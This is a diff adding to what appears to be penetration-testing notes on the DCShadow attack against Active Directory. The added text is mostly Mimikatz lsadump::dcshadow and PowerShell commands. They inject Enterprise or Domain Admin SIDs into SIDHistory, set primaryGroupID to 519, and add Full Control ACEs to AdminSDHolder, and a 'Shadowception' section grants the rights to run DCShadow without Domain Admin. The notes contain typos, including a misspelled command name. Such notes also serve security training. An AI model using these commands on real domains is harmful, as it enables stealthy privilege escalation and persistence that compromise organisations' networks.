@@ -54,3 +54,55 @@ Set-DCShadowPermissions -FakeDC attacker-machine-hostname -samaccountname userna
 ==> now only 1 Mimikatz sessions is requried because username1 can be used and only do lsadump::dcshadow /push
 ```
 {% endcode %}
+
+**Once we have permissions, set SIDHistory of a user account to Enterprise Admin or Domain Admin**&#x20;
+
+{% code overflow="wrap" %}
+```
+lsadump::dcshadow /object:user1 /attribute:SIDHistory /value:S-1-5......
+
+To use without DA, see above:
+Set-DCShadowPermissions -FakeDC attacker-machine-hostname -samaccountname username1 -username currentuser -verbose
+```
+{% endcode %}
+
+**Once we have permissions, set primaryGroupID of a user account to Enterprise Admin or Domain Admin e**
+
+{% code overflow="wrap" %}
+```powershell
+lsadump::dcshadow /object:user1 /attribute:primaryGroupID /value:519
+
+Note: The user show up as member of EA in some enumeration like net group "Enterpise Admins" /domain
+```
+{% endcode %}
+
+**Modify ntSecurityDescriptor for AdminSDHolder to add Full Fontrol for a User**
+
+<pre data-overflow="wrap"><code>Get the current ACL for AdminSDHolder:
+(New-Object System.DirectoryServices.DirectoryEntry("LDAP://CN=AdminSDHolder,CN=System,DC=dom,DC=local")).psbase.ObjectSecurity.sddl
+
+Just need to append a Full Control ACE from above for SY/BA/DA with our users SID at the end 
+<strong>lsadump::dcsahdow /object:CN=AdminSDHolder,CN=System,DC=dom,DC=local /attribute:ntSecurityDescriptor /value:[full modified ACL from above plus following](A;;CC...;;SIDfromyourUser)
+</strong></code></pre>
+
+**Shadowception - Run DCShadow from DCShadow itself**&#x20;
+
+{% code overflow="wrap" %}
+```
+Get the current ACL for the domain:
+(New-Object System.DirectoryServices.DirectoryEntry("LDAP://DC=dom,DC=local")).psbase.ObjectSecurity.sddl | set-clipboard
+
+Append the following ACEs with our User SID on the domain object (see above):
+```
+{% endcode %}
+
+![](<../.gitbook/assets/image (4).png>)
+
+<pre><code><strong>On the attacker computer object (A;;WP;;;UserSID)
+</strong>On the target user object (so that it can modify its own attributes) (A;;WP;;;UserSID)
+On the sites object in configuration container (A;CI;CCDC;;;UserSID)
+
+lsadump::dcshadow /stack /object:DC=dom,DC=local /attribute:ntSecurityDescriptor /value:[full modified ACL from above plus following from above]
+==> Do this for all 3 domain object, attacker computer, target user and sites object
+</code></pre>
+
